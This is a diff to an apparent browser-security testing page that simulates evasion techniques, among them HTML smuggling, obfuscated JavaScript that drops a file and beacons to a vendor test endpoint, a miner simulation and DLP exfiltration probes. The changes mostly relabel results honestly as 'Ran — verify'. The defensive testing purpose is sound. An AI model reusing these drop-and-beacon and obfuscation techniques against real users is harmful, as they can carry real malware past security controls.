@@ -123,18 +123,18 @@
         .payload-modal {
             background: white; border-radius: 16px; padding: 40px; max-width: 450px;
             text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.3);
-            border-top: 8px solid #ef4444; 
+            border-top: 8px solid #4eb0c9;
             animation: popIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
         @keyframes popIn { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
         .modal-icon { font-size: 48px; margin-bottom: 15px; }
-        .modal-title { font-size: 22px; color: #991b1b; margin-bottom: 10px; font-weight: 700; }
+        .modal-title { font-size: 22px; color: #0b2031; margin-bottom: 10px; font-weight: 700; }
         .modal-text { font-size: 15px; color: #334155; line-height: 1.5; margin-bottom: 25px; }
         .modal-btn {
-            background-color: #ef4444; color: white; border: none; border-radius: 20px;
+            background-color: #4eb0c9; color: white; border: none; border-radius: 20px;
             padding: 10px 30px; font-size: 15px; font-weight: 600; cursor: pointer; transition: background 0.2s;
         }
-        .modal-btn:hover { background-color: #dc2626; }
+        .modal-btn:hover { background-color: #3a97ae; }
 
         /* Quishing Portal Styles */
         .quish-portal {
@@ -193,6 +193,12 @@
             font-weight: 700; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 12px rgba(0,0,0,0.2);
         }
         .run-all-btn:hover { background: #3a97ae; transform: translateY(-1px); }
+
+        .verdict-note {
+            max-width: 1100px; margin: 16px auto 0 auto; padding: 14px 20px; background: #fffbeb;
+            border: 1px solid #fde68a; border-radius: 14px; color: #92400e; font-size: 13px; line-height: 1.6;
+        }
+        .verdict-note strong { color: #78350f; }
 
         /* --- Category Tabs --- */
         .tab-bar {
@@ -274,12 +280,13 @@
 
     <div id="payloadModal" class="payload-modal-overlay">
         <div class="payload-modal">
-            <div class="modal-icon">🚨</div>
-            <div class="modal-title">Malicious Payload Execution Successful</div>
+            <div class="modal-icon">🧪</div>
+            <div class="modal-title">Simulation Ran Locally</div>
             <div class="modal-text">
-                The dynamically generated payload successfully bypassed network inspection and executed within the browser DOM. Active code and C2 beacons were deployed.
+                The benign test artifact was reassembled/executed in this browser tab. <strong>This page cannot tell whether your security stack blocked it</strong> — the result you see here is not a verdict.<br><br>
+                Verify the real outcome in your endpoint / enterprise-browser logs (e.g. Strata Cloud Manager), your download folder, and the DevTools console — then mark the dashboard tile <strong>Blocked 🛡️</strong> or <strong>Bypassed ❌</strong>.
             </div>
-            <button class="modal-btn" onclick="closePayloadModal()">Acknowledge</button>
+            <button class="modal-btn" onclick="closePayloadModal()">Got it</button>
         </div>
     </div>
 
@@ -320,6 +327,11 @@
         <div class="dash-item"><span class="dash-label">Malicious Site</span><div id="badge-malsite" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
         <div class="dash-item"><span class="dash-label">Web DLP</span><div id="badge-dlp" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
         <div class="dash-item"><span class="dash-label">Browser Hardening</span><div id="badge-hardening" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
+    </div>
+
+    <div class="verdict-note">
+        ⏳ <strong>How verdicts work:</strong> tiles marked <em>"Ran — verify"</em> mean the simulation executed in this tab — <strong>this page cannot see whether your browser/SWG blocked it.</strong>
+        The URL, malicious-site, and DLP probes auto-classify from what the page can actually observe (whether a request left the browser); everything else — especially <strong>file downloads</strong> — you must confirm in your endpoint / enterprise-browser logs, download folder, and DevTools console, then click the tile to set <strong>Blocked 🛡️</strong> or <strong>Bypassed ❌</strong>. The score only counts tiles you've classified.
     </div>
 
     <div class="tab-bar" id="tabBar">
@@ -729,7 +741,7 @@ document.<span class="var">write</span>(<span class="str">'&lt;script&gt;'</span
         window.triggerEvasionPopup = function(targetBadgeId) {
             document.getElementById('payloadModal').style.display = 'flex';
             if (targetBadgeId) {
-                setBadgeStatus(targetBadgeId, 'status-fired', 'Payload Executed ⚠️');
+                setBadgeStatus(targetBadgeId, 'status-fired', 'Ran — verify ⏳');
             }
         };
         function closePayloadModal() { document.getElementById('payloadModal').style.display = 'none'; }
@@ -762,7 +774,7 @@ document.<span class="var">write</span>(<span class="str">'&lt;script&gt;'</span
             const btnId = 'startChunkTestBtn';
             toggleBtnState(btnId, true);
             updateLog('log1', '', true); 
-            setBadgeStatus('badge-chunk', 'status-fired', 'Payload Sent ⚠️');
+            setBadgeStatus('badge-chunk', 'status-fired', 'Ran — verify ⏳');
             
             updateLog('log1', `Starting network stream of ${GLOBAL_FILENAME}...`);
             let chunks = [], position = 0;
@@ -802,7 +814,7 @@ document.<span class="var">write</span>(<span class="str">'&lt;script&gt;'</span
             const btnId = 'startSmuggleTestBtn';
             toggleBtnState(btnId, true);
             updateLog('log2', '', true);
-            setBadgeStatus('badge-smuggle', 'status-fired', 'Payload Sent ⚠️');
+            setBadgeStatus('badge-smuggle', 'status-fired', 'Ran — verify ⏳');
             
             updateLog('log2', 'Spawning background Web Worker thread...');
             const workerCode = `
@@ -870,7 +882,7 @@ document.<span class="var">write</span>(<span class="str">'&lt;script&gt;'</span
             updateLog('log3', '', true);
             
             // This target JS drops the PE file, beacons out, and specifically triggers the 'badge-poly' update on the dashboard via the popup
-            const targetJS = `const payloadB64='${GLOBAL_PAYLOAD_B64}';const binaryString=atob(payloadB64);const bytes=new Uint8Array(binaryString.length);for(let i=0;i<binaryString.length;i++){bytes[i]=binaryString.charCodeAt(i);}const blob=new Blob([bytes],{type:'application/octet-stream'});const url=URL.createObjectURL(blob);const a=document.createElement('a');a.href=url;a.download='poly_${GLOBAL_FILENAME}';document.body.appendChild(a);a.click();setTimeout(()=>{document.body.removeChild(a);URL.revokeObjectURL(url);},100);fetch('https://wildfire.paloaltonetworks.com/publicapi/test/pe',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({status:'payload_executed'})}).catch(e=>console.log('C2 beacon fired.'));window.triggerEvasionPopup('badge-poly');`;
+            const targetJS = `const payloadB64='${GLOBAL_PAYLOAD_B64}';const binaryString=atob(payloadB64);const bytes=new Uint8Array(binaryString.length);for(let i=0;i<binaryString.length;i++){bytes[i]=binaryString.charCodeAt(i);}const blob=new Blob([bytes],{type:'application/octet-stream'});const url=URL.createObjectURL(blob);const a=document.createElement('a');a.href=url;a.download='poly_${GLOBAL_FILENAME}';document.body.appendChild(a);a.click();setTimeout(()=>{document.body.removeChild(a);URL.revokeObjectURL(url);},100);fetch('https://wildfire.paloaltonetworks.com/publicapi/test/pe',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({status:'payload_executed'})}).catch(e=>console.log('beacon request attempted; outcome not observable from page'));window.triggerEvasionPopup('badge-poly');`;
             
             updateLog('log3', 'Requesting dynamic JS payload generation from engine...');
             const uniqueScriptStr = generatePolymorphicScript(targetJS);
@@ -893,7 +905,7 @@ document.<span class="var">write</span>(<span class="str">'&lt;script&gt;'</span
         document.querySelectorAll('.quish-trigger').forEach(trigger => {
             trigger.addEventListener('click', (e) => {
                 e.preventDefault(); 
-                setBadgeStatus('badge-quish', 'status-fired', 'Payload Executed ⚠️');
+                setBadgeStatus('badge-quish', 'status-fired', 'Ran — verify ⏳');
                 window.open('https://urlfiltering.paloaltonetworks.com/test-phishing', '_blank');
             });
         });
@@ -903,7 +915,7 @@ document.<span class="var">write</span>(<span class="str">'&lt;script&gt;'</span
             const btnId = 'startSvgTestBtn';
             toggleBtnState(btnId, true);
             updateLog('log5', '', true);
-            setBadgeStatus('badge-svg', 'status-fired', 'Payload Sent ⚠️');
+            setBadgeStatus('badge-svg', 'status-fired', 'Ran — verify ⏳');
             
             updateLog('log5', 'Creating invisible SVG element in DOM...');
             const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
@@ -935,7 +947,7 @@ document.<span class="var">write</span>(<span class="str">'&lt;script&gt;'</span
             const btnId = 'startCryptoTestBtn';
             toggleBtnState(btnId, true);
             updateLog('log6', '', true);
-            setBadgeStatus('badge-crypto', 'status-fired', 'Executing ⚠️');
+            setBadgeStatus('badge-crypto', 'status-fired', 'Running ⏳');
             
             document.getElementById('mining-bar').style.display = 'block';
             const progress = document.getElementById('mining-progress');
@@ -997,7 +1009,7 @@ document.<span class="var">write</span>(<span class="str">'&lt;script&gt;'</span
                 const totalHashes = results.reduce((a, b) => a + b, 0);
                 updateLog('log6', `Mining complete. Calculated ${(totalHashes / 1000000).toFixed(2)} Million hashes across 8 cores.`);
                 updateLog('log6', `Attempted outbound connection to wss://xmr.pool.minergate.com.`);
-                setBadgeStatus('badge-crypto', 'status-fired', 'Payload Executed ⚠️');
+                setBadgeStatus('badge-crypto', 'status-fired', 'Ran (benign) ⏳');
             } catch (e) {
                 clearInterval(interval);
                 updateLog('log6', 'Miner interrupted or failed.');
@@ -1016,7 +1028,7 @@ document.<span class="var">write</span>(<span class="str">'&lt;script&gt;'</span
             const btnId = 'startWsTestBtn';
             toggleBtnState(btnId, true);
             updateLog('log7', '', true);
-            setBadgeStatus('badge-ws', 'status-fired', 'Payload Sent ⚠️');
+            setBadgeStatus('badge-ws', 'status-fired', 'Ran — verify ⏳');
 
             updateLog('log7', 'Initiating HTTP request... upgrading via 101 Switching Protocols...');
             const wsUrl = 'wss://ws.postman-echo.com/raw';
@@ -1075,7 +1087,7 @@ document.<span class="var">write</span>(<span class="str">'&lt;script&gt;'</span
 
             // 1. Define the malicious script payload we want to hide (Drop PE, Beacon, and Popup)
             // It explicitly passes 'badge-obfuscation' to the popup so the correct dashboard tile gets updated
-            const targetJS = `const payloadB64='${GLOBAL_PAYLOAD_B64}';const binaryString=atob(payloadB64);const bytes=new Uint8Array(binaryString.length);for(let i=0;i<binaryString.length;i++){bytes[i]=binaryString.charCodeAt(i);}const blob=new Blob([bytes],{type:'application/octet-stream'});const url=URL.createObjectURL(blob);const a=document.createElement('a');a.href=url;a.download='obfuscated_js_${GLOBAL_FILENAME}';document.body.appendChild(a);a.click();setTimeout(()=>{document.body.removeChild(a);URL.revokeObjectURL(url);},100);fetch('https://wildfire.paloaltonetworks.com/publicapi/test/pe',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({status:'payload_executed'})}).catch(e=>console.log('C2 beacon fired.'));window.triggerEvasionPopup('badge-obfuscation');`;
+            const targetJS = `const payloadB64='${GLOBAL_PAYLOAD_B64}';const binaryString=atob(payloadB64);const bytes=new Uint8Array(binaryString.length);for(let i=0;i<binaryString.length;i++){bytes[i]=binaryString.charCodeAt(i);}const blob=new Blob([bytes],{type:'application/octet-stream'});const url=URL.createObjectURL(blob);const a=document.createElement('a');a.href=url;a.download='obfuscated_js_${GLOBAL_FILENAME}';document.body.appendChild(a);a.click();setTimeout(()=>{document.body.removeChild(a);URL.revokeObjectURL(url);},100);fetch('https://wildfire.paloaltonetworks.com/publicapi/test/pe',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({status:'payload_executed'})}).catch(e=>console.log('beacon request attempted; outcome not observable from page'));window.triggerEvasionPopup('badge-obfuscation');`;
             
             // 2. Base64 encode the executable JavaScript (This is what the attacker obfuscates)
             const b64JS = btoa(targetJS);
@@ -1138,7 +1150,7 @@ document.<span class="var">write</span>(<span class="str">'&lt;script&gt;'</span
             updateLog('log9', 'If your security stack did not warn/block before you reached this point, a locally-rendered phishing page bypassed it.');
             document.getElementById('phishEmail').value = '';
             document.getElementById('phishPass').value = '';
-            setBadgeStatus('badge-phish', 'status-fired', 'Page Rendered ⚠️');
+            setBadgeStatus('badge-phish', 'status-fired', 'Ran — verify ⏳');
             window.triggerEvasionPopup(null);
         }
 
@@ -1146,16 +1158,18 @@ document.<span class="var">write</span>(<span class="str">'&lt;script&gt;'</span
             const btnId = 'startPhishUrlBtn';
             toggleBtnState(btnId, true);
             updateLog('log9', '', true);
-            setBadgeStatus('badge-phish', 'status-fired', 'Page Rendered ⚠️');
+            setBadgeStatus('badge-phish', 'status-fired', 'Ran — verify ⏳');
             const phishUrl = 'https://urlfiltering.paloaltonetworks.com/test-phishing';
             updateLog('log9', `Attempting to reach known phishing test URL: ${phishUrl}`);
             const reached = await probeReachable(phishUrl);
             if (reached) {
                 updateLog('log9', '⚠️ Request completed — URL filtering did NOT block the phishing category.');
+                markVector('badge-phish', false);
             } else {
                 updateLog('log9', '🛡️ Request was blocked/unreachable — your filter likely caught the phishing category.');
+                markVector('badge-phish', true);
             }
-            updateLog('log9', 'Click the "Phishing Page" dashboard tile to record whether your controls blocked it.');
+            updateLog('log9', 'Note: this reflects only the URL-reachability probe. A request can also fail for benign network reasons — confirm in your filtering logs. Click the tile to override.');
             toggleBtnState(btnId, false, 'Test Phishing-URL Reachability');
         }
 
@@ -1260,7 +1274,7 @@ document.<span class="var">write</span>(<span class="str">'&lt;script&gt;'</span
             const btnId = 'startMalSiteBtn';
             toggleBtnState(btnId, true);
             updateLog('log11', '', true);
-            setBadgeStatus('badge-malsite', 'status-fired', 'Testing ⚠️');
+            setBadgeStatus('badge-malsite', 'status-fired', 'Probing ⏳');
             const targets = [
                 { name: 'Palo Alto URL-filtering test', url: 'https://urlfiltering.paloaltonetworks.com/test-malware' },
                 { name: 'AMTSO malware-download test', url: 'https://www.amtso.org/feature-settings-check-download/' },
@@ -1275,8 +1289,13 @@ document.<span class="var">write</span>(<span class="str">'&lt;script&gt;'</span
                 else { updateLog('log11', `   🛡️ Blocked / unreachable — filter likely intercepted it.`); }
             }
             updateLog('log11', `Summary: ${reachedCount}/${targets.length} known-bad categories were reachable.`);
-            if (reachedCount === 0) markVector('badge-malsite', true);
-            else updateLog('log11', 'Click the "Malicious Site" tile to record your verdict.');
+            if (reachedCount === 0) {
+                markVector('badge-malsite', true);
+                updateLog('log11', '🛡️ All known-bad categories were blocked/unreachable.');
+            } else {
+                markVector('badge-malsite', false);
+                updateLog('log11', `⚠️ ${reachedCount} known-bad categor${reachedCount === 1 ? 'y was' : 'ies were'} reachable — filtering gap. Confirm in your URL-filtering logs; click the tile to override.`);
+            }
             toggleBtnState(btnId, false, 'Run Category-Block Test');
         }
 
@@ -1295,7 +1314,7 @@ document.<span class="var">write</span>(<span class="str">'&lt;script&gt;'</span
             const btnId = 'startDlpBtn';
             toggleBtnState(btnId, true);
             updateLog('log12', '', true);
-            setBadgeStatus('badge-dlp', 'status-fired', 'Exfil Attempted ⚠️');
+            setBadgeStatus('badge-dlp', 'status-fired', 'Probing ⏳');
             const data = document.getElementById('dlpInput').value || DLP_PRESETS.canary;
             updateLog('log12', `Synthetic canary payload: "${data}"`);
             updateLog('log12', 'NOTE: values are non-real test data; nothing sensitive is exposed.');
@@ -1329,8 +1348,13 @@ document.<span class="var">write</span>(<span class="str">'&lt;script&gt;'</span
             else updateLog('log12', '   🛡️ Beacon blocked.');
 
             updateLog('log12', `Summary: ${leaks}/3 exfiltration channels were NOT blocked by DLP.`);
-            if (leaks === 0) markVector('badge-dlp', true);
-            else updateLog('log12', 'Click the "Web DLP" tile to record your verdict.');
+            if (leaks === 0) {
+                markVector('badge-dlp', true);
+                updateLog('log12', '🛡️ All three channels were blocked.');
+            } else {
+                markVector('badge-dlp', false);
+                updateLog('log12', `⚠️ ${leaks}/3 channels left the browser — DLP gap. Note: with no-cors the page sees the request leave but not the server response, so a downstream DLP proxy could still strip it. Confirm in your DLP logs; click the tile to override.`);
+            }
             toggleBtnState(btnId, false, 'Attempt Exfiltration');
         }
 
